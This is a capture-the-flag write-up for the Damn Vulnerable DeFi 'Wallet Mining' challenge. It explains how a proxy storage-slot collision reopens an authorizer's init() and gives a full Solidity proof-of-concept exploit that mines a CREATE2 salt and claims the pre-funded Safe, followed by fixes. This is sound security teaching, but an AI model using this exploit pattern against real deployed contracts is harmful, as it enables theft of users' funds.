# Wallet Mining - A Storage Collision Reopens the Door

**Challenge:** Damn Vulnerable DeFi v4 - Wallet Mining
**Category:** Storage Collision / Unprotected Re-Initialization / CREATE2 Address Mining
**Severity:** Critical (20,000,000 DVT sitting at a not-yet-deployed address, plus the reward pot)

## What's going on

This one is based on a real incident, not a made-up scenario. A wallet deployer pays out
1 DVT to anyone who deploys a Gnosis Safe at an address an authorizer contract has
pre-approved. The idea is that a known "ward" gets rewarded for deploying a specific
user's wallet at a specific, already-computed address — in this case
`0xCe07CF30B540Bb84ceC5dA5547e1cb4722F9E496`, which already holds 20,000,000 DVT because
someone sent funds there before the wallet existed. The player starts with nothing and
has to walk away having put that Safe in place, sent the funds to the rightful user, and
forwarded the reward to the ward — all in a single transaction, and without the user
herself ever signing a transaction (only off-chain signatures from her key are allowed).

## The bug

The authorizer is upgradeable and sits behind a transparent proxy. Both contracts use
plain storage variables instead of namespaced slots, and both happen to put their first
variable in slot 0:

```solidity
// AuthorizerUpgradeable.sol
uint256 public needsInit = 1;

// TransparentProxy.sol
address public upgrader = msg.sender;
```

The proxy delegatecalls into the implementation, so they share storage. Slot 0 is
`needsInit` from the implementation's point of view, and `upgrader` from the proxy's.

The factory that wires this all together does it in the wrong order:

```solidity
authorizer = address(
    new TransparentProxy(
        address(new AuthorizerUpgradeable()),
        abi.encodeCall(AuthorizerUpgradeable.init, (wards, aims))
    )
);
assert(AuthorizerUpgradeable(authorizer).needsInit() == 0); // passes here
TransparentProxy(payable(authorizer)).setUpgrader(upgrader); // overwrites slot 0!
```

`init()` runs during construction and correctly zeroes `needsInit`, so the `assert`
right after it passes. But the very next line, `setUpgrader`, writes the upgrader's
address into that same slot 0. From then on, `needsInit()` returns a non-zero value
(the upgrader's address, read as a uint), and `init()` has no other guard:

```solidity
function init(address[] memory _wards, address[] memory _aims) external {
    require(needsInit != 0, "cannot init");
    ...
}
```

So `init` is wide open again, permanently, to anyone. You can call it and register
yourself as a ward for the deposit address, with no permission check at all.

## The attack

Everything below runs inside the constructor of a single helper contract, so the
player's nonce stays at 1.

1. **Re-open the authorizer.** Call `init()` again, registering the attacker contract
   itself as a ward for the deposit address — the storage collision lets this through.
2. **Find the right CREATE2 parameters.** The deposit address is a counterfactual Safe:
   a plain 1-of-1 wallet owned by the user, no modules, no fallback handler. With the
   Safe factory already deployed at its usual deterministic address, the only unknown is
   the salt nonce. Brute-forcing it against `vm.computeCreate2Address` finds the match
   (nonce 13 in this setup) rather than hardcoding a number pulled out of thin air.
3. **Deploy the Safe through `drop()`.** Since the attacker is now an authorized ward for
   that address, `walletDeployer.drop(...)` deploys the Safe exactly where the funds are
   sitting, and pays out the 1 DVT reward to the attacker contract.
4. **Forward the reward.** Send that 1 DVT on to the real ward, who was supposed to
   receive it.
5. **Move the funds out, signed, not sent.** The user's private key signs a Safe
   transaction (off-chain, via `vm.sign`) transferring the 20,000,000 DVT to her own
   address. The attacker submits that signed transaction through `execTransaction`. The
   user's own nonce never moves.

## PoC

```solidity
function test_walletMining() public checkSolvedByPlayer {
    address[] memory owners = new address[](1);
    owners[0] = user;
    bytes memory initializer = abi.encodeCall(
        Safe.setup, (owners, 1, address(0), "", address(0), address(0), 0, payable(address(0)))
    );

    uint256 saltNonce;
    bytes32 initCodeHash =
        keccak256(abi.encodePacked(type(SafeProxy).creationCode, uint256(uint160(address(singletonCopy)))));
    for (; saltNonce < 100; saltNonce++) {
        address predicted = vm.computeCreate2Address(
            keccak256(abi.encodePacked(keccak256(initializer), saltNonce)), initCodeHash, address(proxyFactory)
        );
        if (predicted == USER_DEPOSIT_ADDRESS) break;
    }

    bytes memory transferData = abi.encodeCall(token.transfer, (user, DEPOSIT_TOKEN_AMOUNT));
    bytes32 safeTxHash = keccak256(abi.encode(
        0xbb8310d486368db6bd6f849402fdd73ad53d316b5a4b2644ad6efe0f941286d8,
        address(token), 0, keccak256(transferData), Enum.Operation.Call,
        0, 0, 0, address(0), address(0), 0
    ));
    bytes32 domainSeparator = keccak256(abi.encode(
        0x47e79534a245952e8b16893a336b85a3d9ea9fa8c573f3d803afb92a79469218,
        block.chainid, USER_DEPOSIT_ADDRESS
    ));
    bytes32 txHash = keccak256(abi.encodePacked(bytes1(0x19), bytes1(0x01), domainSeparator, safeTxHash));
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, txHash);

    new WalletMiningExploit(
        authorizer, walletDeployer, token, ward, USER_DEPOSIT_ADDRESS,
        initializer, saltNonce, transferData, abi.encodePacked(r, s, v)
    );
}

contract WalletMiningExploit {
    constructor(
        AuthorizerUpgradeable authorizer, WalletDeployer walletDeployer, DamnValuableToken token,
        address ward, address safe, bytes memory initializer, uint256 saltNonce,
        bytes memory transferData, bytes memory signatures
    ) {
        address[] memory wards = new address[](1);
        address[] memory aims = new address[](1);
        wards[0] = address(this);
        aims[0] = safe;
        authorizer.init(wards, aims);

        require(walletDeployer.drop(safe, initializer, saltNonce), "drop failed");
        token.transfer(ward, token.balanceOf(address(this)));

        Safe(payable(safe)).execTransaction(
            address(token), 0, transferData, Enum.Operation.Call, 0, 0, 0,
            address(0), payable(address(0)), signatures
        );
    }
}
```

Full test file: `test/wallet-mining/WalletMining.t.sol`

## Why I'm calling this Critical

- **The guard was never real.** A flag that lives in a colliding storage slot isn't a
  guard at all — it's whatever the proxy happens to write there next.
- **Two separate pots of value are exposed.** The 20,000,000 DVT at the deposit address,
  and the reward token sitting in the wallet deployer, both become reachable by anyone
  who notices the collision.
- **No privileges needed to start.** The attacker begins as a complete stranger to the
  system and authorizes themselves.
- **This happened for real.** This challenge is modeled on an actual incident where
  pre-computed Safe addresses were funded before deployment, and a bug in the deployer's
  authorization let an attacker mine the matching wallet and take the funds.

## Fix

- **Never let a proxy and its implementation share ordinary storage slots.** Use
  namespaced/diamond storage, or OpenZeppelin's own upgradeable initializer pattern,
  which keeps initialization state out of slot 0 entirely.
- **Make initialization genuinely one-time.** A boolean flag in colliding storage is not
  an initializer guard — use `Initializable`'s `initializer` modifier, or an explicit
  version counter stored somewhere the proxy can't touch.
- **Check invariants after every state-changing call in the deployment sequence, not just
  after the first one.** The `assert` here ran a line too early to catch the very write
  that broke it.
- **Pay the address that was actually authorized**, not whichever account happens to call
  the function, so a successful re-authorization attack can't redirect the reward too.

## Takeaway

When a proxy and an upgradeable implementation both declare ordinary state variables,
write down what lives in slot 0 for each of them before trusting any "already
initialized" flag. The 20,000,000 DVT here was never actually in a wallet — it was
sitting at an address waiting for the right CREATE2 parameters, and the one thing
supposed to gate who could deploy there turned out to be sharing a slot with something
the deployment flow wrote to on its own, a moment after the guard was set.
